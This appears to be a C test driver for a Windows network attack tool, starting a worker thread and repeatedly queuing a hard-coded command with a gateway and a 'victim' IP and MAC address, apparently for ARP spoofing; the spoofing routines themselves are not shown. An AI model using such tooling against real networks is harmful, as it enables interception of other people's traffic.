#define TEST

#include <stdio.h>
#include <WS2tcpip.h>

#include "ipc_manage.h"
#include "commands.h"

int main(int argc, char** argv)
{
	Sleep(1000);
	/* locals */
	HANDLE action_thread;
	u_char buffer[100];
	size_t buf_size = sizeof buffer;
	pCommand p;
#ifndef TEST
	//connect to the parnet process
	connect_to_parent_process();
#endif
	action_thread = CreateThread(
		NULL, 
		0, 
		execute_commands, 
		NULL, 
		0, 
		NULL
	);
	
	for (;;)
	{
#ifndef TEST
		//wait for command from parent process
		get_command(buffer, buf_size);
#else
		
		//execute the command
		BYTE g_mac[] = { 0xc8, 0xbe, 0x19, 0x26, 0x74, 0xcb };
		BYTE v_mac[] = { 0x28, 0x3a, 0x4d, 0x0d, 0x3d, 0x17 };

		p = (pCommand)(buffer+sizeof(int));
		p->act = 1;
		inet_pton(AF_INET, "192.168.8.254", &p->gateway_ip);
		inet_pton(AF_INET, "192.168.8.9", &p->victim_ip);
		p->gateway_ip = htonl(p->gateway_ip);
		p->victim_ip = htonl(p->victim_ip);
		CopyMemory(p->gateway_mac, g_mac, 6);
		CopyMemory(p->victim_mac, v_mac, 6);
#endif
		add_command(p);
		Sleep(1000);
	}
	
}